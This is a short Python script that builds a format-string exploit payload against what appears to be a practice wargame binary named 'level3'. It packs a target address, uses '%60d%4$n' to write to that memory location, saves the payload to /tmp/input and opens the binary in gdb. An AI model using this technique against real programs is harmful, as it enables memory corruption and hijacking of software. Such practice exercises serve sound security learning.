#!/usr/bin/python

import os

writeAddr = "\x08\x04\x98\x8c"[::-1]
writeAddr2 = "\x08\x04\x98\x8e"[::-1]
payload = writeAddr + "%60d" + "%4\$n" 
cmd = "echo \"" + payload + "\" > /tmp/input && gdb -tui /home/user/level3/level3"
os.system(cmd)
